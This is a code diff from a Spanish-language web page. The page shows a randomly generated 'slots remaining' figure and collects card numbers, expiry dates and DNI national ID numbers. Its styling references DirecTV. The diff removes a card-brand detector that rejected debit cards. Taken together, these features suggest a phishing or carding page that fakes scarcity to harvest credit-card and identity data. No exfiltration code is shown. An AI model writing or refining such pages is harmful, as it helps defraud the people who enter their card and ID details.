@@ -371,33 +371,13 @@
     // Cupo aleatorio entre 44-49
     document.getElementById('cupo-num').textContent = Math.floor(44 + Math.random() * 6);
 
-    function detectBrand(n) {
-        if (/^3[47]/.test(n)) return 'AMEX';
-        if (/^5895|^4029|^3777/.test(n)) return 'NARANJA';
-        // Cualquier tarjeta que arranque con 6 se acepta como CABAL (cubre todos sus rangos BIN reales)
-        if (/^6/.test(n)) return 'CABAL';
-        if (/^4(517|508|152|282|310)/.test(n) || /^(50|56|57|58)/.test(n) || /^5896/.test(n)) return 'DEBITO';
-        if (/^4/.test(n)) return 'VISA';
-        if (/^5[1-5]|^2[2-7]/.test(n)) return 'MASTERCARD';
-        return '';
-    }
 
     const fCard = document.getElementById('f-card');
     const fExp  = document.getElementById('f-exp');
     const fDni  = document.getElementById('f-dni');
     const badge = document.getElementById('brand-badge');
 
-    fCard.addEventListener('input', function() {
-        let v = this.value.replace(/\D/g,'');
-        const brand = detectBrand(v);
-        let fmt = v.match(/^(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})$/);
-        if (fmt) this.value = [fmt[1],fmt[2],fmt[3],fmt[4]].filter(Boolean).join(' ');
-        if (brand === 'DEBITO') {
-            badge.textContent = '✗ SOLO CRÉDITO'; badge.style.color = '#b91c1c'; badge.style.background = '#fee2e2'; badge.style.display = 'block';
-        } else if (brand) {
-            badge.textContent = brand; badge.style.color = 'var(--dtv-blue)'; badge.style.background = '#e8f6fd'; badge.style.display = 'block';
-        } else { badge.style.display = 'none'; }
-    });
+
 
     fExp.addEventListener('input', function(e) {
         let v = this.value.replace(/\D/g,'');
